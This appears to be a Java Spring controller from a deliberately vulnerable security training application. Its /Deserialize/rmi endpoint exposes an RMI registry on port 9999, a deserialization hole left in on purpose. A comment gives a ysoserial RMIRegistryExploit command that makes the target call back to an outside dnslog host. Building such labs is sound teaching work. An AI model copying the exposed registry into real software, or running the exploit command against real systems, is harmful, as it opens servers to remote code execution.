package com.best.hello.controller.RMI;

import io.swagger.annotations.ApiOperation;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

@Slf4j
@RestController
@RequestMapping("/Deserialize")
public class RegistryVul {

    /**
     * 检测：java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit ip 9999 JRMPClient "rmi.c3blgk.dnslog.cn"
     */
    @ApiOperation(value = "vul：Java RMI Registry 反序列化漏洞", notes = "<=jdk8u111")
    @RequestMapping("/rmi")
    public String rmi() {
        try {
            Registry registry = LocateRegistry.createRegistry(9999);
            log.info("[+] RMI Listening: 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "开启RMI监听，端口：9999";
    }
}
